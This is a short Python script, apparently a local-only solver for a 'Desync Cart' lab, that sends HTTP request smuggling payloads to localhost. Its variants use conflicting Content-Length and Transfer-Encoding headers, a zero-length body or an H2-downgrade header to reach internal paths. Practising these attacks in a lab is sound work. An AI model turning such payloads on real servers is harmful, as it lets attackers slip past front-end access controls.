#!/usr/bin/env python3
"""Local-only replay helper for the five Desync Cart lessons."""
import argparse, socket

targets = {"boundary":"/internal/boundary", "cl-te":"/internal/fulfillment", "te-cl":"/internal/te-cl", "cl-zero":"/internal/cl-zero", "h2-downgrade":"/internal/h2-downgrade"}
parser = argparse.ArgumentParser(); parser.add_argument("--challenge", choices=targets); parser.add_argument("--port", type=int, default=8080); args = parser.parse_args()
extra = b"X-Lab-Protocol: h2-downgrade\r\n" if args.challenge == "h2-downgrade" else b""
framing = b"Content-Length: 0\r\n" if args.challenge == "cl-zero" else b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
body = b"" if args.challenge == "cl-zero" else b"0\r\n\r\n"
wire = b"POST / HTTP/1.1\r\nHost: desync-commerce\r\n" + framing + extra + b"Connection: keep-alive\r\n\r\n" + body + b"GET " + targets[args.challenge].encode() + b" HTTP/1.1\r\nHost: desync-commerce\r\nConnection: close\r\n\r\n"
with socket.create_connection(("127.0.0.1", args.port), timeout=3) as sock:
    sock.sendall(wire); sock.settimeout(3); output=b""
    try:
        while True:
            part=sock.recv(8192)
            if not part: break
            output += part
    except socket.timeout: pass
print(output.decode("latin1", "replace"))
